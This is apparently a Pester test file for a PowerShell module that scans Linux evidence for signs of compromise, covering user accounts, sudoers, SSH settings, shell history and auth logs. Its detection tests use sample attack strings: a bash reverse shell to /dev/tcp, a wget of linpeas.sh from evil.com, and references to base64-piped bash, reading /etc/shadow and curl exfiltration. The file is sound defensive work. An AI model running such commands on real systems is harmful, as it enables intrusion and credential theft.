#Requires -Modules Pester

<#
.SYNOPSIS
    Comprehensive Pester 5 tests for the PWSPostProcessingSuite module.
.DESCRIPTION
    Tests module import, utility functions, individual analyzers, and
    full-scan integration against TestData simulating a compromised Linux system.
#>

BeforeAll {
    $ModuleRoot = Split-Path -Parent $PSScriptRoot

    # Import the module to validate exports
    Import-Module (Join-Path $ModuleRoot 'PWSPostProcessingSuite.psd1') -Force -ErrorAction Stop

    # Dot-source all module files directly so private functions are accessible in test scope
    $PrivateFunctions = Get-ChildItem -Path (Join-Path $ModuleRoot 'Private') -Recurse -Filter '*.ps1' -ErrorAction SilentlyContinue
    $PublicFunctions  = Get-ChildItem -Path (Join-Path $ModuleRoot 'Public') -Filter '*.ps1' -ErrorAction SilentlyContinue

    foreach ($file in @($PrivateFunctions + $PublicFunctions)) {
        . $file.FullName
    }

    # Set module-scoped variables needed by analyzers and public functions
    $Script:ModuleRoot = $ModuleRoot
    $Script:DefaultRules = $null
    $Script:SeverityOrder = @{
        'Critical'      = 0
        'High'          = 1
        'Medium'        = 2
        'Low'           = 3
        'Informational' = 4
    }

    # Load default rules
    $rulesPath = Join-Path (Join-Path $ModuleRoot 'Config') 'DefaultRules.yaml'
    if (Test-Path $rulesPath) {
        $Script:DefaultRules = Import-YamlConfig -Path $rulesPath
    }

    $TestDataPath = Join-Path $PSScriptRoot 'TestData'
}

# =====================================================================
# 1. Module Import Tests
# =====================================================================
Describe 'Module Import Tests' {

    Context 'Module loads correctly' {

        It 'Should import the module without errors' {
            $module = Get-Module -Name 'PWSPostProcessingSuite'
            $module | Should -Not -BeNullOrEmpty
        }

        It 'Should have the correct module version' {
            $module = Get-Module -Name 'PWSPostProcessingSuite'
            $module.Version | Should -Be '1.0.0'
        }

        It 'Should have a valid module manifest' {
            $manifestPath = Join-Path $ModuleRoot 'PWSPostProcessingSuite.psd1'
            Test-Path $manifestPath | Should -BeTrue
            { Test-ModuleManifest -Path $manifestPath -ErrorAction Stop } | Should -Not -Throw
        }

        It 'Should have a root module file' {
            Test-Path (Join-Path $ModuleRoot 'PWSPostProcessingSuite.psm1') | Should -BeTrue
        }

        It 'Should have default rules config' {
            Test-Path (Join-Path (Join-Path $ModuleRoot 'Config') 'DefaultRules.yaml') | Should -BeTrue
        }
    }

    Context 'Exports correct public functions' {

        It 'Should export Invoke-LinuxArtifactScan' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Invoke-LinuxArtifactScan' |
                Should -Not -BeNullOrEmpty
        }

        It 'Should export Get-ScanReport' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Get-ScanReport' |
                Should -Not -BeNullOrEmpty
        }

        It 'Should export Import-ScanRules' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Import-ScanRules' |
                Should -Not -BeNullOrEmpty
        }

        It 'Should export exactly 3 public functions' {
            $exported = @(Get-Command -Module 'PWSPostProcessingSuite')
            $exported.Count | Should -Be 3
        }
    }

    Context 'Does not export private functions' {

        It 'Should not export New-Finding' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'New-Finding' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export Resolve-ArtifactPath' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Resolve-ArtifactPath' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export Read-ArtifactContent' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Read-ArtifactContent' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export Test-ArtifactExists' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Test-ArtifactExists' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export ConvertTo-Timeline' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'ConvertTo-Timeline' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export Test-PatternMatch' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Test-PatternMatch' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export Import-YamlConfig' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Import-YamlConfig' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export Get-ArtifactFiles' {
            Get-Command -Module 'PWSPostProcessingSuite' -Name 'Get-ArtifactFiles' -ErrorAction SilentlyContinue |
                Should -BeNullOrEmpty
        }

        It 'Should not export any analyzer functions' {
            $analyzerNames = @(
                'Invoke-UserAccountAnalyzer', 'Invoke-SudoersAnalyzer', 'Invoke-SSHConfigAnalyzer',
                'Invoke-ShellHistoryAnalyzer', 'Invoke-AuthLogAnalyzer', 'Invoke-CronAnalyzer',
                'Invoke-LDPreloadAnalyzer', 'Invoke-SysctlAnalyzer'
            )
            foreach ($name in $analyzerNames) {
                Get-Command -Module 'PWSPostProcessingSuite' -Name $name -ErrorAction SilentlyContinue |
                    Should -BeNullOrEmpty -Because "$name is a private function and should not be exported"
            }
        }

        It 'Should not export reporting functions' {
            $reportingNames = @('Export-CsvReport', 'Export-HtmlReport', 'Export-TimelineReport', 'Write-ConsoleSummary')
            foreach ($name in $reportingNames) {
                Get-Command -Module 'PWSPostProcessingSuite' -Name $name -ErrorAction SilentlyContinue |
                    Should -BeNullOrEmpty -Because "$name is a private function and should not be exported"
            }
        }
    }

    Context 'All expected analyzer files exist' {

        It 'Should have all 25 analyzer files' {
            $expectedAnalyzers = @(
                'Invoke-UserAccountAnalyzer', 'Invoke-SudoersAnalyzer', 'Invoke-SSHConfigAnalyzer',
                'Invoke-PAMAnalyzer', 'Invoke-CronAnalyzer', 'Invoke-SystemdAnalyzer',
                'Invoke-ShellProfileAnalyzer', 'Invoke-ShellHistoryAnalyzer', 'Invoke-SSHKeyAnalyzer',
                'Invoke-SysctlAnalyzer', 'Invoke-FstabAnalyzer', 'Invoke-NetworkConfigAnalyzer',
                'Invoke-FirewallAnalyzer', 'Invoke-WebServerAnalyzer', 'Invoke-AuthLogAnalyzer',
                'Invoke-SyslogAnalyzer', 'Invoke-AuditLogAnalyzer', 'Invoke-PackageLogAnalyzer',
                'Invoke-KernelModuleAnalyzer', 'Invoke-LDPreloadAnalyzer', 'Invoke-EnvironmentAnalyzer',
                'Invoke-ProcessAnalyzer', 'Invoke-FilesystemAnalyzer', 'Invoke-LogIntegrityAnalyzer',
                'Invoke-ContainerAnalyzer'
            )
            foreach ($analyzer in $expectedAnalyzers) {
                $path = Join-Path (Join-Path (Join-Path $ModuleRoot 'Private') 'Analyzers') "${analyzer}.ps1"
                Test-Path $path | Should -BeTrue -Because "$analyzer.ps1 should exist"
            }
        }
    }
}

# =====================================================================
# 2. Utility Function Tests
# =====================================================================
Describe 'Utility Function Tests' {

    Context 'New-Finding creates objects with correct properties and PSTypeName' {

        It 'Should create a Finding with PSTypeName PWSPostProcessingSuite.Finding' {
            $finding = New-Finding -Id 'TEST-001' -Severity 'High' -Category 'Test' `
                -Title 'Test Finding' -Description 'A test finding'
            $finding.PSTypeNames | Should -Contain 'PWSPostProcessingSuite.Finding'
        }

        It 'Should populate all mandatory properties correctly' {
            $finding = New-Finding -Id 'TEST-002' -Severity 'Critical' -Category 'Security' `
                -Title 'Critical Issue' -Description 'Something critical happened'

            $finding.Id          | Should -Be 'TEST-002'
            $finding.Severity    | Should -Be 'Critical'
            $finding.Category    | Should -Be 'Security'
            $finding.Title       | Should -Be 'Critical Issue'
            $finding.Description | Should -Be 'Something critical happened'
        }

        It 'Should have empty defaults for optional properties' {
            $finding = New-Finding -Id 'TEST-003' -Severity 'Low' -Category 'Test' `
                -Title 'Defaults' -Description 'Testing defaults'

            $finding.ArtifactPath   | Should -Be ''
            $finding.Evidence       | Should -HaveCount 0
            $finding.Recommendation | Should -Be ''
            $finding.MITRE          | Should -Be ''
            $finding.Timestamp      | Should -BeNullOrEmpty
        }

        It 'Should accept all optional parameters including Timestamp' {
            $ts = Get-Date '2025-01-15 10:30:00'
            $finding = New-Finding -Id 'TEST-004' -Severity 'Medium' -Category 'Test' `
                -Title 'Full' -Description 'All params' `
                -ArtifactPath '/etc/passwd' `
                -Evidence @('line1', 'line2') `
                -Recommendation 'Fix it' `
                -Timestamp $ts `
                -MITRE 'T1078'

            $finding.ArtifactPath   | Should -Be '/etc/passwd'
            $finding.Evidence       | Should -HaveCount 2
            $finding.Evidence[0]    | Should -Be 'line1'
            $finding.Recommendation | Should -Be 'Fix it'
            $finding.Timestamp      | Should -Be $ts
            $finding.MITRE          | Should -Be 'T1078'
        }

        It 'Should reject invalid severity values' {
            { New-Finding -Id 'X' -Severity 'SuperBad' -Category 'X' -Title 'X' -Description 'X' } |
                Should -Throw
        }

        It 'Should accept each valid severity level' {
            foreach ($sev in @('Critical', 'High', 'Medium', 'Low', 'Informational')) {
                $f = New-Finding -Id "S-$sev" -Severity $sev -Category 'Test' -Title $sev -Description $sev
                $f.Severity | Should -Be $sev
            }
        }
    }

    Context 'Resolve-ArtifactPath finds files in mirror structure' {

        It 'Should find etc/passwd in the evidence mirror' {
            $result = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
            Test-Path $result | Should -BeTrue
        }

        It 'Should handle paths with and without leading slash identically' {
            $result1 = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
            $result2 = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath 'etc/passwd'
            $result1 | Should -Be $result2
        }

        It 'Should find nested paths like etc/ssh/sshd_config' {
            $result = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/ssh/sshd_config'
            Test-Path $result | Should -BeTrue
        }

        It 'Should return a path (even if non-existent) for files not in the evidence' {
            $result = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/nonexistent'
            $result | Should -Not -BeNullOrEmpty
        }

        It 'Should find files in var/log subdirectory' {
            $result = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/var/log/auth.log'
            Test-Path $result | Should -BeTrue
        }
    }

    Context 'Read-ArtifactContent reads files correctly' {

        It 'Should read file contents and return an array of lines' {
            $passwdPath = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
            $content = Read-ArtifactContent -Path $passwdPath
            $content | Should -Not -BeNullOrEmpty
            $content.Count | Should -BeGreaterThan 5
        }

        It 'Should return the correct first line from etc/passwd' {
            $passwdPath = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
            $lines = Read-ArtifactContent -Path $passwdPath
            $lines[0] | Should -BeLike 'root:*'
        }

        It 'Should return an empty array for non-existent files' {
            $content = Read-ArtifactContent -Path '/nonexistent/file/path'
            $content | Should -Not -BeNull
            @($content).Count | Should -Be 0
        }

        It 'Should respect MaxLines parameter' {
            $passwdPath = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
            $content = Read-ArtifactContent -Path $passwdPath -MaxLines 3
            $content.Count | Should -BeLessOrEqual 3
        }

        It 'Should read multi-line files like auth.log' {
            $authPath = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/var/log/auth.log'
            $lines = Read-ArtifactContent -Path $authPath
            $lines.Count | Should -BeGreaterThan 10
        }
    }

    Context 'Test-ArtifactExists returns correct boolean' {

        It 'Should return $true for existing artifacts' {
            Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/etc/passwd' |
                Should -BeTrue
        }

        It 'Should return $true for nested existing artifacts' {
            Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/etc/ssh/sshd_config' |
                Should -BeTrue
        }

        It 'Should return $false for non-existent artifacts' {
            Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/etc/doesnotexist' |
                Should -BeFalse
        }

        It 'Should return $true for var/log/auth.log' {
            Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/var/log/auth.log' |
                Should -BeTrue
        }

        It 'Should return $false for completely missing directory paths' {
            Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/nonexistent/path/file.conf' |
                Should -BeFalse
        }
    }

    Context 'Get-ArtifactFiles enumerates directory contents' {

        It 'Should enumerate files in a directory' {
            $files = Get-ArtifactFiles -EvidencePath $TestDataPath -LinuxPath '/etc/ssh'
            @($files).Count | Should -BeGreaterThan 0
        }

        It 'Should return empty array for non-existent directory' {
            $files = Get-ArtifactFiles -EvidencePath $TestDataPath -LinuxPath '/nonexistent/dir'
            @($files).Count | Should -Be 0
        }
    }

    Context 'ConvertTo-Timeline sorts by timestamp' {

        It 'Should sort findings by timestamp in ascending order' {
            $findings = @(
                New-Finding -Id 'T-1' -Severity 'Low' -Category 'Test' -Title 'Late' `
                    -Description 'Later event' -Timestamp ([datetime]'2025-03-15 14:00:00')
                New-Finding -Id 'T-2' -Severity 'High' -Category 'Test' -Title 'Early' `
                    -Description 'Earlier event' -Timestamp ([datetime]'2025-03-15 10:00:00')
                New-Finding -Id 'T-3' -Severity 'Medium' -Category 'Test' -Title 'Mid' `
                    -Description 'Middle event' -Timestamp ([datetime]'2025-03-15 12:00:00')
            )

            $timeline = $findings | ConvertTo-Timeline
            $timeline.Count | Should -Be 3
            $timeline[0].FindingId | Should -Be 'T-2'
            $timeline[1].FindingId | Should -Be 'T-3'
            $timeline[2].FindingId | Should -Be 'T-1'
        }

        It 'Should exclude findings without timestamps' {
            $findings = @(
                New-Finding -Id 'T-A' -Severity 'Low' -Category 'Test' -Title 'Has TS' `
                    -Description 'With timestamp' -Timestamp ([datetime]'2025-01-01')
                New-Finding -Id 'T-B' -Severity 'Low' -Category 'Test' -Title 'No TS' `
                    -Description 'Without timestamp'
            )

            $timeline = $findings | ConvertTo-Timeline
            $timeline.Count | Should -Be 1
            $timeline[0].FindingId | Should -Be 'T-A'
        }

        It 'Should produce objects with PSTypeName PWSPostProcessingSuite.TimelineEntry' {
            $finding = New-Finding -Id 'T-X' -Severity 'Low' -Category 'Test' -Title 'X' `
                -Description 'X' -Timestamp (Get-Date)
            $timeline = @($finding) | ConvertTo-Timeline
            $timeline[0].PSTypeNames | Should -Contain 'PWSPostProcessingSuite.TimelineEntry'
        }

        It 'Should carry over Severity, Category, Title, and MITRE to timeline entries' {
            $finding = New-Finding -Id 'T-Y' -Severity 'Critical' -Category 'Auth' `
                -Title 'Auth Event' -Description 'Test' -Timestamp (Get-Date) -MITRE 'T1078'
            $timeline = @($finding) | ConvertTo-Timeline
            $timeline[0].Severity | Should -Be 'Critical'
            $timeline[0].Category | Should -Be 'Auth'
            $timeline[0].Title    | Should -Be 'Auth Event'
            $timeline[0].MITRE    | Should -Be 'T1078'
        }
    }

    Context 'Test-PatternMatch matches patterns correctly' {

        It 'Should return Matched=$true when a pattern matches' {
            $patterns = @(
                @{ pattern = 'bash\s+-i.*>/dev/tcp/'; severity = 'Critical'; mitre = 'T1059.004'; name = 'Bash reverse shell' }
            )
            $result = Test-PatternMatch -InputText 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' -Patterns $patterns
            $result.Matched | Should -BeTrue
        }

        It 'Should return the correct severity and MITRE from the matched rule' {
            $patterns = @(
                @{ pattern = 'linpeas'; severity = 'High'; mitre = 'T1068'; name = 'LinPEAS' }
            )
            $result = Test-PatternMatch -InputText 'wget http://evil.com/linpeas.sh' -Patterns $patterns
            $result.Severity | Should -Be 'High'
            $result.MITRE    | Should -Be 'T1068'
            $result.RuleName | Should -Be 'LinPEAS'
        }

        It 'Should return Matched=$false when no pattern matches' {
            $patterns = @(
                @{ pattern = 'xmrig'; severity = 'Critical'; mitre = 'T1496'; name = 'XMRig' }
            )
            $result = Test-PatternMatch -InputText 'ls -la /home' -Patterns $patterns
            $result.Matched | Should -BeFalse
        }

        It 'Should default severity to Medium when rule does not specify one' {
            $patterns = @(
                @{ pattern = 'test123' }
            )
            $result = Test-PatternMatch -InputText 'this is test123 data' -Patterns $patterns
            $result.Matched  | Should -BeTrue
            $result.Severity | Should -Be 'Medium'
        }

        It 'Should match the first matching pattern and stop' {
            $patterns = @(
                @{ pattern = 'first';  severity = 'Low';  name = 'First' }
                @{ pattern = 'first';  severity = 'High'; name = 'Second' }
            )
            $result = Test-PatternMatch -InputText 'this is first match' -Patterns $patterns
            $result.RuleName | Should -Be 'First'
        }

        It 'Should handle invalid regex patterns gracefully and continue' {
            $patterns = @(
                @{ pattern = '(invalid['; severity = 'High'; name = 'Bad regex' }
                @{ pattern = 'valid';     severity = 'Low';  name = 'Good regex' }
            )
            $result = Test-PatternMatch -InputText 'this is valid text' -Patterns $patterns
            $result.Matched  | Should -BeTrue
            $result.RuleName | Should -Be 'Good regex'
        }

        It 'Should return empty strings for non-match properties when nothing matches' {
            $patterns = @(
                @{ pattern = 'nomatch'; severity = 'High'; name = 'NoMatch' }
            )
            $result = Test-PatternMatch -InputText 'innocent text' -Patterns $patterns
            $result.Matched  | Should -BeFalse
            $result.Pattern  | Should -Be ''
            $result.Severity | Should -Be ''
            $result.MITRE    | Should -Be ''
            $result.RuleName | Should -Be ''
        }
    }

    Context 'Import-YamlConfig' {

        It 'Should throw for a non-existent file' {
            { Import-YamlConfig -Path '/nonexistent/rules.yaml' } | Should -Throw
        }

        It 'Should return a hashtable from the default rules file' {
            $rulesFile = Join-Path (Join-Path $ModuleRoot 'Config') 'DefaultRules.yaml'
            $result = Import-YamlConfig -Path $rulesFile
            $result | Should -BeOfType [hashtable]
        }

        It 'Should parse the suspicious_commands key from default rules' {
            $rulesFile = Join-Path (Join-Path $ModuleRoot 'Config') 'DefaultRules.yaml'
            $result = Import-YamlConfig -Path $rulesFile
            $result.Keys | Should -Contain 'suspicious_commands'
        }

        It 'Should parse the dangerous_sudoers_binaries key from default rules' {
            $rulesFile = Join-Path (Join-Path $ModuleRoot 'Config') 'DefaultRules.yaml'
            $result = Import-YamlConfig -Path $rulesFile
            $result.Keys | Should -Contain 'dangerous_sudoers_binaries'
        }
    }
}

# =====================================================================
# 3. Analyzer Integration Tests (using TestData)
# =====================================================================
Describe 'Analyzer Integration Tests' {

    Context 'UserAccountAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:userFindings = Invoke-UserAccountAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:userFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect UID 0 backdoor account (backup_admin) as Critical (ACCT-001)' {
            $uid0 = $script:userFindings | Where-Object { $_.Id -eq 'ACCT-001' }
            $uid0 | Should -Not -BeNullOrEmpty
            $uid0.Severity | Should -Be 'Critical'
            $uid0.Title | Should -BeLike '*backup_admin*'
        }

        It 'Should detect weak MD5 hash algorithm for john as High (ACCT-006)' {
            $weak = @($script:userFindings | Where-Object { $_.Id -eq 'ACCT-006' })
            $weak | Should -Not -BeNullOrEmpty
            $johnWeak = $weak | Where-Object { $_.Title -like '*john*' }
            $johnWeak | Should -Not -BeNullOrEmpty
            $johnWeak.Severity | Should -Be 'High'
        }

        It 'Should detect empty password for backup_admin as High (ACCT-002)' {
            $empty = $script:userFindings | Where-Object { $_.Id -eq 'ACCT-002' }
            $empty | Should -Not -BeNullOrEmpty
            ($empty | Where-Object { $_.Title -like '*backup_admin*' }) | Should -Not -BeNullOrEmpty
        }

        It 'Should detect service account daemon with interactive shell as Medium (ACCT-003)' {
            $svcShell = @($script:userFindings | Where-Object { $_.Id -eq 'ACCT-003' })
            $svcShell | Should -Not -BeNullOrEmpty
            ($svcShell | Where-Object { $_.Title -like '*daemon*' }) | Should -Not -BeNullOrEmpty
        }

        It 'Should detect duplicate UID 0 as Medium (ACCT-007)' {
            $dupes = $script:userFindings | Where-Object { $_.Id -eq 'ACCT-007' }
            $dupes | Should -Not -BeNullOrEmpty
            $dupes.Severity | Should -Be 'Medium'
        }

        It 'Should detect accounts without password expiration (ACCT-004)' {
            $noExpiry = $script:userFindings | Where-Object { $_.Id -eq 'ACCT-004' }
            $noExpiry | Should -Not -BeNullOrEmpty
        }

        It 'Should include an informational user account summary (ACCT-005)' {
            $summary = $script:userFindings | Where-Object { $_.Id -eq 'ACCT-005' }
            $summary | Should -Not -BeNullOrEmpty
            $summary.Severity | Should -Be 'Informational'
        }

        It 'Should have MITRE ATT&CK references on findings' {
            $uid0 = $script:userFindings | Where-Object { $_.Id -eq 'ACCT-001' }
            $uid0.MITRE | Should -Not -BeNullOrEmpty
        }
    }

    Context 'SudoersAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:sudoFindings = Invoke-SudoersAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:sudoFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect NOPASSWD:ALL rule for john as Critical (SUDO-001)' {
            $nopasswd = @($script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-001' -and $_.Severity -eq 'Critical' })
            $nopasswd | Should -Not -BeNullOrEmpty
            ($nopasswd.Evidence -join ' ') | Should -BeLike '*NOPASSWD*'
            ($nopasswd.Title -join ' ') | Should -BeLike '*john*'
        }

        It 'Should treat root NOPASSWD as Informational (SUDO-001)' {
            # root already has UID 0 - NOPASSWD is redundant, not a security issue
            $rootRules = @($script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-001' -and $_.Title -like '*root*' })
            if ($rootRules.Count -gt 0) {
                $rootRules[0].Severity | Should -Be 'Informational'
            }
        }

        It 'Should detect dangerous binaries (vim, python3) in sudoers as High (SUDO-003)' {
            $dangerous = @($script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-003' })
            $dangerous | Should -Not -BeNullOrEmpty
            $dangerousTitles = ($dangerous | ForEach-Object { $_.Title }) -join ' '
            # admin has vim and python3 in sudoers
            ($dangerousTitles -match 'vim' -or $dangerousTitles -match 'python') | Should -BeTrue
        }

        It 'Should detect ALL command access grants with context-aware severity (SUDO-002)' {
            $allAccess = @($script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-002' })
            $allAccess | Should -Not -BeNullOrEmpty
            # root ALL=(ALL:ALL) ALL should be Informational (standard default)
            $rootAll = $allAccess | Where-Object { $_.Title -like '*root*' }
            if ($rootAll) {
                $rootAll.Severity | Should -Be 'Informational'
            }
            # %admin/%sudo groups should be Low (standard config with password)
            $groupAll = $allAccess | Where-Object { $_.Title -like '*%admin*' -or $_.Title -like '*%sudo*' }
            if ($groupAll) {
                ($groupAll | ForEach-Object { $_.Severity }) | Should -Contain 'Low'
            }
        }

        It 'Should include an informational sudoers summary (SUDO-005)' {
            $summary = $script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-005' }
            $summary | Should -Not -BeNullOrEmpty
            $summary.Severity | Should -Be 'Informational'
        }

        It 'Should reference MITRE T1548.003 for sudo findings' {
            $nopasswd = @($script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-001' -and $_.Severity -eq 'Critical' })
            $nopasswd | Should -Not -BeNullOrEmpty
            $nopasswd[0].MITRE | Should -Be 'T1548.003'
        }

        It 'Should detect missing use_pty directive (SUDO-006)' {
            $usePty = $script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-006' }
            $usePty | Should -Not -BeNullOrEmpty
            $usePty.Severity | Should -Be 'Medium'
        }

        It 'Should detect missing logfile directive (SUDO-007)' {
            $logfile = $script:sudoFindings | Where-Object { $_.Id -eq 'SUDO-007' }
            $logfile | Should -Not -BeNullOrEmpty
            $logfile.Severity | Should -Be 'Low'
        }
    }

    Context 'SSHConfigAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:sshFindings = Invoke-SSHConfigAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:sshFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect PermitRootLogin yes as Critical (SSH-001)' {
            $rootLogin = $script:sshFindings | Where-Object { $_.Id -eq 'SSH-001' -and $_.Severity -eq 'Critical' }
            $rootLogin | Should -Not -BeNullOrEmpty
        }

        It 'Should detect PasswordAuthentication yes as High (SSH-002)' {
            $pwAuth = $script:sshFindings | Where-Object { $_.Id -eq 'SSH-002' }
            $pwAuth | Should -Not -BeNullOrEmpty
            $pwAuth.Severity | Should -Be 'High'
        }

        It 'Should detect X11Forwarding yes as Medium (SSH-004)' {
            $x11 = $script:sshFindings | Where-Object { $_.Id -eq 'SSH-004' }
            $x11 | Should -Not -BeNullOrEmpty
            $x11.Severity | Should -Be 'Medium'
        }

        It 'Should detect MaxAuthTries 10 as too high (SSH-007)' {
            $maxAuth = $script:sshFindings | Where-Object { $_.Id -eq 'SSH-007' }
            $maxAuth | Should -Not -BeNullOrEmpty
            $maxAuth.Severity | Should -Be 'Medium'
            $maxAuth.Title | Should -BeLike '*10*'
        }

        It 'Should detect AllowAgentForwarding + PermitRootLogin combo as High (SSH-008)' {
            $agentCombo = $script:sshFindings | Where-Object { $_.Id -eq 'SSH-008' }
            $agentCombo | Should -Not -BeNullOrEmpty
            $agentCombo.Severity | Should -Be 'High'
        }

        It 'Should reference MITRE T1021.004 for SSH findings' {
            $rootLogin = $script:sshFindings | Where-Object { $_.Id -eq 'SSH-001' -and $_.Severity -eq 'Critical' }
            $rootLogin.MITRE | Should -Be 'T1021.004'
        }
    }

    Context 'ShellHistoryAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:histFindings = Invoke-ShellHistoryAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:histFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect reverse shell / encoded command patterns (HIST-001)' {
            $suspiciousHist = $script:histFindings | Where-Object { $_.Id -eq 'HIST-001' }
            $suspiciousHist | Should -Not -BeNullOrEmpty
        }

        It 'Should detect base64 encoded command execution' {
            # The history has: echo '...' | base64 -d | bash
            $allTitles   = ($script:histFindings | ForEach-Object { $_.Title }) -join ' '
            $allEvidence = ($script:histFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            ($allTitles -match '(?i)encoded|base64' -or $allEvidence -match 'base64') | Should -BeTrue
        }

        It 'Should detect linpeas / privilege escalation tool usage' {
            $allTitles   = ($script:histFindings | ForEach-Object { $_.Title }) -join ' '
            $allEvidence = ($script:histFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            ($allTitles -match '(?i)privilege|escalation' -or $allEvidence -match 'linpeas') | Should -BeTrue
        }

        It 'Should detect defense evasion (history -c)' {
            $allTitles   = ($script:histFindings | ForEach-Object { $_.Title }) -join ' '
            $allEvidence = ($script:histFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            ($allTitles -match '(?i)defense|evasion' -or $allEvidence -match 'history -c') | Should -BeTrue
        }

        It 'Should detect credential access (cat /etc/shadow)' {
            $allTitles   = ($script:histFindings | ForEach-Object { $_.Title }) -join ' '
            $allEvidence = ($script:histFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            ($allTitles -match '(?i)credential' -or $allEvidence -match '/etc/shadow') | Should -BeTrue
        }

        It 'Should detect data exfiltration (curl upload)' {
            $allTitles   = ($script:histFindings | ForEach-Object { $_.Title }) -join ' '
            $allEvidence = ($script:histFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            ($allTitles -match '(?i)exfiltration' -or $allEvidence -match 'curl.*exfil') | Should -BeTrue
        }

        It 'Should detect download-and-execute patterns' {
            $allTitles   = ($script:histFindings | ForEach-Object { $_.Title }) -join ' '
            $allEvidence = ($script:histFindings | ForEach-Object { $_.Evidence -join ' ' }) -join ' '
            ($allTitles -match '(?i)download' -or $allEvidence -match 'wget.*linpeas') | Should -BeTrue
        }

        It 'Should include an informational shell history summary (HIST-002)' {
            $summary = $script:histFindings | Where-Object { $_.Id -eq 'HIST-002' }
            $summary | Should -Not -BeNullOrEmpty
            $summary.Severity | Should -Be 'Informational'
        }
    }

    Context 'AuthLogAnalyzer' {

        BeforeAll {
            $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
            $script:authFindings = Invoke-AuthLogAnalyzer -EvidencePath $TestDataPath -Rules $rules
        }

        It 'Should return findings' {
            $script:authFindings.Count | Should -BeGreaterThan 0
        }

        It 'Should detect brute force success (login after 6 failures from 192.168.1.100) as Critical (AUTH-001)' {
            $bruteSuccess = @($script:authFindings | Where-Object { $_.Id -eq 'AUTH-001' })
            $bruteSuccess | Should -Not -BeNullOrEmpty
            $bruteSuccess[0].Severity | Should -Be 'Critical'
            ($bruteSuccess[0].Title) | Should -BeLike '*192.168.1.100*'
        }

        It 'Should detect brute force failed login pattern as High (AUTH-002)' {
            $bruteFail = @($script:authFindings | Where-Object { $_.Id -eq 'AUTH-002' })
            $bruteFail | Should -Not -BeNullOrEmpty
            $bruteFail[0].Severity | Should -Be 'High'
        }

        It 'Should detect credential stuffing from 10.0.0.50 targeting multiple users (AUTH-007)' {
            $stuffing = @($script:authFindings | Where-Object { $_.Id -eq 'AUTH-007' })
            $stuffing | Should -Not -BeNullOrEmpty
            ($stuffing[0].Title) | Should -BeLike '*10.0.0.50*'
        }

        It 'Should detect off-hours authentication at 23:45 (AUTH-006)' {
            $offHours = $script:authFindings | Where-Object { $_.Id -eq 'AUTH-006' }
            $offHours | Should -Not -BeNullOrEmpty
        }

        It 'Should detect sudo command usage (AUTH-004)' {
            $sudo = $script:authFindings | Where-Object { $_.Id -eq 'AUTH-004' }
            $sudo | Should -Not -BeNullOrEmpty
        }

        It 'Should detect user login from multiple IPs (AUTH-005)' {
